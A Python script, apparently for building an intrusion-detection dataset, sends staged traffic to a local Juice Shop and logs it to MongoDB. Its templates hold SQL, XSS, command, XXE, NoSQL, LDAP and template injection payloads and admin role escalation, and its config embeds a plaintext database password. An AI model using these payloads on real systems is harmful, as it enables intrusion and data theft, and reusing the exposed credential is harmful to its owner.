import requests
import random
import json
from pymongo import MongoClient
import sys

# -------------------- CONFIG --------------------
MONGO_URI = "mongodb+srv://koustavmitra18_db_user:idsDB%4069@ids-dataset-cluster.wvxuucs.mongodb.net/?appName=ids-dataset-cluster"
DB_NAME = "AttackDetection"
COLL_NAME = "newSessions"
JUICE_SHOP_URL = "http://localhost:3000"

SESSIONS_PER_STAGE = 48   # NORMAL, RECON, FUZZING, INJECTION, EXPLOITATION -> 240 sessions total

# Target ~10,000 total -> ~41-42 requests/session average across 240 sessions
REQS_MIN = 43
REQS_MAX = 46

REQUEST_TIMEOUT = 3
MAX_FAILS = 400
MAX_ATTEMPTS_MULT = 25
# ------------------------------------------------

# Quick connectivity check
try:
    r = requests.get(JUICE_SHOP_URL, timeout=5)
    if r.status_code != 200:
        print(f"Juice Shop returned {r.status_code}. Is it running?")
        sys.exit(1)
except Exception:
    print("Cannot reach Juice Shop – start it first.")
    sys.exit(1)

print("Juice Shop reachable. Dropping old data & connecting to MongoDB...")
client = MongoClient(MONGO_URI)
db = client[DB_NAME]
coll = db[COLL_NAME]
coll.drop()
print(f"Cleared {DB_NAME}.{COLL_NAME}\n")

# ------------------------------------------------------------------
# Per-stage User-Agent pools (attack tooling vs. real browsers vs. scanners
# is real, useful signal for the classifier — keep them distinct)
# ------------------------------------------------------------------
NORMAL_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
]

RECON_UAS = [
    "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
    "Mozilla/5.0 (compatible; Nikto/2.1.6)",
    "python-requests/2.31.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Go-http-client/1.1",
    "curl/7.68.0",
]

FUZZ_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "curl/7.68.0",
    "python-requests/2.31.0",
]

INJ_UAS = [
    "sqlmap/1.5.2#stable",
    "curl/7.68.0",
    "python-requests/2.31.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
]

EXP_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    "curl/7.68.0",
    "python-requests/2.31.0",
    "sqlmap/1.5.2#stable",
]

STAGE_UAS = {
    "NORMAL": NORMAL_UAS,
    "RECON": RECON_UAS,
    "FUZZING": FUZZ_UAS,
    "INJECTION": INJ_UAS,
    "EXPLOITATION": EXP_UAS,
}

def rand_ua(stage):
    return random.choice(STAGE_UAS.get(stage, FUZZ_UAS))

def browser_like_headers():
    """Full browser fingerprint headers — used for stages that mimic real browser traffic."""
    return {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "sec-ch-ua": '"Not-A.Brand";v="24", "Chromium";v="146"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": random.choice(['"Windows"', '"macOS"', '"Linux"']),
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": f"{JUICE_SHOP_URL}/",
    }

def minimal_headers():
    """Bare-bones headers — used for scanner/tool-driven traffic (recon, injection)."""
    return {"Accept": "*/*"}

STAGE_HEADER_PROFILE = {
    "NORMAL": browser_like_headers,
    "RECON": minimal_headers,
    "FUZZING": minimal_headers,
    "INJECTION": minimal_headers,
    "EXPLOITATION": browser_like_headers,  # exploit traffic often rides a real-looking browser session
}

# ------------------------------------------------------------------
# Templates
# ------------------------------------------------------------------
NORMAL_TEMPLATES = [
    {"method":"GET","path":"/rest/products"},
    {"method":"GET","path":lambda: f"/rest/products/{random.randint(1,20)}"},
    {"method":"GET","path":lambda: f"/rest/products/{random.randint(1,20)}/reviews"},
    {"method":"GET","path":lambda: f"/rest/products/search?q={random.choice(['juice','apple','banana','tea','watch','lemon','hoodie','gift','oil','fruit'])}"},
    {"method":"GET","path":"/rest/user/whoami"},
    {"method":"GET","path":"/rest/basket/1"},
    {"method":"POST","path":"/api/BasketItems","body":lambda: {"ProductId": random.randint(1,20), "BasketId": 1, "quantity": random.randint(1,5)}},
    {"method":"POST","path":"/api/Feedbacks","body":lambda: {"comment": random.choice(["Great product!","Fast delivery, thanks.","Really enjoyed this.","Will buy again.","Good quality for the price."]), "rating": random.randint(1,5)}},
    {"method":"GET","path":"/rest/languages"},
    {"method":"GET","path":"/api/Quantitys"},
    {"method":"POST","path":"/rest/user/login","body":lambda: {"email": f"user{random.randint(1,999)}@example.com", "password": "Password123!"}},
    {"method":"GET","path":lambda: f"/rest/products/search?q={random.choice(['', 'gift', 'card'])}"},
]

RECON_TEMPLATES = [
    {"method":"GET","path":"/robots.txt"},
    {"method":"GET","path":"/sitemap.xml"},
    {"method":"GET","path":"/.well-known/security.txt"},
    {"method":"GET","path":"/main.js"},
    {"method":"HEAD","path":"/"},
    {"method":"OPTIONS","path":"/rest/products"},
    {"method":"GET","path":"/rest/admin/application-version"},
    {"method":"GET","path":"/rest/captcha"},
    {"method":"GET","path":"/api/Challenges"},
    {"method":"GET","path":lambda: f"/rest/products/{random.randint(1,60)}"},
    {"method":"GET","path":"/.git/config"},
    {"method":"GET","path":"/server-status"},
    {"method":"HEAD","path":"/rest/products"},
    {"method":"GET","path":"/metrics"},
]

FUZZ_TEMPLATES = [
    {"method":"GET","path":lambda: f"/rest/products/{random.choice([1,2,3,9999,-1,0,'test','null','1.5'])}/reviews"},
    {"method":"GET","path":lambda: f"/rest/products/{random.choice([1,2,3,9999,-1,0,'test','null','1.5'])}/reviews"},
    {"method": "GET", "path": lambda: f"/rest/products/search?q={random.choice(['\'', '\"', '\\\\', '%00', 'undefined', 'null', '<', '>', ' OR 1=1'])}"},
    {"method":"GET","path":lambda: f"/rest/products/search?q={random.choice(['', '%00', 'test', '1', 'a'*100])}"},
    {"method":"POST","path":"/rest/user/login","body":lambda: {"email":"test@test.com","password":random.choice(["","a","a"*255,"!@#$%","€uro","😀"])}},
    {"method":"POST","path":"/rest/user/login","body":lambda: {"email":random.choice(["","notanemail","a@a"]),"password":"test"}},
    {"method":"GET","path":lambda: f"/api/{random.choice(['Users','Products','Orders','Admin','Config','Debug'])}"},
    {"method":"GET","path":lambda: f"/api/{random.choice(['Users','Products','Orders','Admin','Config','Debug'])}"},
    {"method":"GET","path":lambda: f"/{random.choice(['admin','api','config','.git','.env','wp-admin','backup','login','register'])}"},
    {"method":lambda: random.choice(["GET","POST","PUT","DELETE","PATCH","OPTIONS","HEAD"]),"path":"/rest/products/1/reviews"},
    {"method":"POST","path":"/api/Feedbacks","body":{"comment":"test"},"extra_headers":lambda: {"Content-Type":random.choice(["text/plain","application/xml","multipart/form-data","image/png"])}},
]

INJ_TEMPLATES = [
    {"method":"POST","path":"/rest/user/login","body":lambda: {"email":random.choice(["' OR 1=1--","' || 1=1#","admin'--","') OR 1=1--"]),"password":"x"}},
    {"method":"POST","path":"/rest/user/login","body":lambda: {"email":random.choice(["' UNION SELECT 1,2,3,4,5--","' UNION SELECT username,password FROM Users--"]),"password":"x"}},
    {"method": "GET", "path": lambda: "/rest/products/search?q=" + random.choice(['%27+UNION+SELECT+1', '%27+AND+1%3D1', '%27+OR+1%3D1', 'SQLI_TEST', "' OR '1'='1"])},
    {"method": "GET", "path": lambda: "/rest/products/search?q=" + random.choice(['%27+UNION+SELECT+1', '%27+AND+1%3D1', '%27+OR+1%3D1', 'SQLI_TEST', "' OR '1'='1"])},
    {"method":"POST","path":"/api/Feedbacks","body":lambda: {"comment": random.choice(["<script>alert(1)</script>","<img src=x onerror=alert(1)>","<svg/onload=alert(1)>","'><script>alert(1)</script>"])}},
    {"method":"GET","path":lambda: f"/rest/products/search?q={random.choice(['<script>alert(1)</script>','\\\"><script>alert(1)</script>','<img src=x onerror=alert(1)>'])}"},
    {"method":"GET","path":lambda: f"/file-upload?filename={random.choice(['; ls','| cat /etc/passwd','$(whoami).jpg','`id`.php'])}"},
    {"method":"POST","path":"/rest/user/login","body":lambda: {"email":{random.choice(["$ne","$gt","$regex"]): None if random.choice(["$ne","$gt"]) else ".*"},"password":"x"}},
    {"method":"POST","path":"/api/Feedbacks","body":lambda: {"comment": random.choice(["{{7*7}}","${7*7}","<%= 7*7 %>","#{7*7}","{{config}}"])}},
    {"method":"POST","path":"/rest/user/login","body":lambda: {"email":random.choice(["*)(uid=*))(|(uid=*","admin)(&)","*","*)(|(password=*)"]),"password":"x"}},
    {"method":"POST","path":"/api/Users","body":lambda: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><user><email>&xxe;</email><password>pass</password></user>",
     "extra_headers":{"Content-Type":"application/xml"}},
]

EXP_TEMPLATES = [
    {"method":"GET","path":"/administration"},
    {"method":"GET","path":"/administration"},
    {"method":"GET","path":"/api/Users"},
    {"method":"GET","path":lambda: f"/api/Users/{random.randint(1,20)}"},
    {"method":"PUT","path":lambda: f"/api/Users/{random.randint(2,5)}","body":{"role":"admin"}},
    {"method":"PUT","path":lambda: f"/api/Users/{random.randint(2,5)}","body":{"role":"admin","isActive":False}},
    {"method":"GET","path":lambda: f"/ftp/{random.choice(['acquisitions.md','legal.md','coupons_2013.md.bak'])}"},
    {"method":"GET","path":"/ftp"},
    {"method":"DELETE","path":lambda: f"/api/BasketItems/{random.randint(1,20)}"},
    {"method":"DELETE","path":lambda: f"/api/BasketItems/{random.randint(1,20)}"},
    {"method":"GET","path":"/administration/data-export"},
]

STAGE_TEMPLATES = {
    "NORMAL": NORMAL_TEMPLATES,
    "RECON": RECON_TEMPLATES,
    "FUZZING": FUZZ_TEMPLATES,
    "INJECTION": INJ_TEMPLATES,
    "EXPLOITATION": EXP_TEMPLATES,
}

def extract_mime(content_type):
    if not content_type:
        return "Unknown"
    ct = content_type.lower()
    if "json" in ct: return "JSON"
    if "html" in ct: return "HTML"
    if "text" in ct: return "text"
    if "xml" in ct: return "XML"
    return "Unknown"

def send_request(s, method, path, body, ua, base_headers, token=None, extra_headers=None):
    url = f"{JUICE_SHOP_URL}{path}"
    headers = {"User-Agent": ua}
    headers.update(base_headers)
    if extra_headers:
        headers.update(extra_headers)
    if token:
        headers["Authorization"] = f"Bearer {token}"

    try:
        if method == "GET":
            resp = s.get(url, headers=headers, timeout=REQUEST_TIMEOUT)
        elif method == "POST":
            if isinstance(body, str):
                resp = s.post(url, data=body, headers=headers, timeout=REQUEST_TIMEOUT)
            else:
                resp = s.post(url, json=body, headers=headers, timeout=REQUEST_TIMEOUT)
        elif method == "PUT":
            resp = s.put(url, json=body, headers=headers, timeout=REQUEST_TIMEOUT)
        elif method == "DELETE":
            resp = s.delete(url, headers=headers, timeout=REQUEST_TIMEOUT)
        elif method == "OPTIONS":
            resp = s.options(url, headers=headers, timeout=REQUEST_TIMEOUT)
        elif method == "PATCH":
            resp = s.patch(url, json=body, headers=headers, timeout=REQUEST_TIMEOUT)
        elif method == "HEAD":
            resp = s.head(url, headers=headers, timeout=REQUEST_TIMEOUT)
        else:
            return None

        req_headers = dict(resp.request.headers)
        body_str = ""
        if isinstance(body, dict):
            body_str = json.dumps(body)
        elif isinstance(body, str):
            body_str = body

        return {
            "request": {
                "method": method,
                "url": url,
                "path": path,
                "headers": req_headers,
                "body": body_str
            },
            "response": {
                "status": resp.status_code,
                "length": len(resp.content),
                "mime_type": extract_mime(resp.headers.get("Content-Type",""))
            }
        }
    except Exception:
        return None

def generate_one_session(stage_name, session_id, num_reqs):
    templates = STAGE_TEMPLATES[stage_name]
    header_fn = STAGE_HEADER_PROFILE[stage_name]
    docs = []
    s = requests.Session()
    ua = rand_ua(stage_name)
    token = None
    seen = set()
    fail_count = 0
    attempts = 0
    max_attempts = num_reqs * MAX_ATTEMPTS_MULT

    if stage_name == "EXPLOITATION":
        login_resp = send_request(s, "POST", "/rest/user/login",
                                  {"email":"' OR 1=1--","password":"x"}, ua, header_fn())
        if login_resp:
            token = "SIMULATED_TOKEN"
            doc = login_resp
            doc["session_id"] = session_id
            doc["request_number"] = 1
            doc["attack_stage"] = stage_name
            doc["traffic_type"] = stage_name.lower()
            doc["source"] = {"xml_file": f"{stage_name.lower()}_{session_id.split('_')[1]}.xml", "generated": True}
            docs.append(doc)

    req_num = len(docs)
    while req_num < num_reqs and attempts < max_attempts and fail_count < MAX_FAILS:
        attempts += 1
        tmpl = random.choice(templates)
        method = tmpl["method"]() if callable(tmpl["method"]) else tmpl["method"]
        path = tmpl["path"]() if callable(tmpl["path"]) else tmpl["path"]
        body = tmpl.get("body")
        if callable(body):
            body = body()
        extra_headers = tmpl.get("extra_headers")
        if callable(extra_headers):
            extra_headers = extra_headers()
        elif extra_headers is None:
            extra_headers = None

        body_key = json.dumps(body, sort_keys=True) if isinstance(body, dict) else (body or "")
        key = (method, path, body_key)

        if key in seen and attempts < max_attempts:
            continue
        seen.add(key)

        resp_data = send_request(s, method, path, body, ua, header_fn(), token, extra_headers)
        if resp_data is None:
            fail_count += 1
            continue

        req_num += 1
        doc = resp_data
        doc["session_id"] = session_id
        doc["request_number"] = req_num
        doc["attack_stage"] = stage_name
        doc["traffic_type"] = stage_name.lower()
        doc["source"] = {"xml_file": f"{stage_name.lower()}_{session_id.split('_')[1]}.xml", "generated": True}
        docs.append(doc)

        if req_num % 10 == 0:
            print(".", end="", flush=True)

    return docs

# ------------------------------------------------------------------
# Generation & insertion — one stage at a time, insert per-session
# ------------------------------------------------------------------
STAGES = ["NORMAL", "RECON", "FUZZING", "INJECTION", "EXPLOITATION"]
stage_totals = {}
total_reqs = 0

for stage in STAGES:
    print(f"=== {stage} ({SESSIONS_PER_STAGE} sessions) ===")
    stage_docs_count = 0
    for i in range(1, SESSIONS_PER_STAGE + 1):
        sid = f"{stage}_{i:03d}"
        n = random.randint(REQS_MIN, REQS_MAX)
        docs = generate_one_session(stage, sid, n)
        if docs:
            coll.insert_many(docs)
            stage_docs_count += len(docs)
            print(f"\n  {sid}: {len(docs)} requests – inserted")
        else:
            print(f"\n  {sid}: 0 requests")
    stage_totals[stage] = stage_docs_count
    total_reqs += stage_docs_count
    print(f"{stage} done: {stage_docs_count} requests.\n")

# ------------------------------------------------------------------
# Summary
# ------------------------------------------------------------------
print(f"\n✅ Total inserted: {total_reqs} requests into {DB_NAME}.{COLL_NAME}")
for stage in STAGES:
    print(f"   {stage:<13}: {stage_totals[stage]}")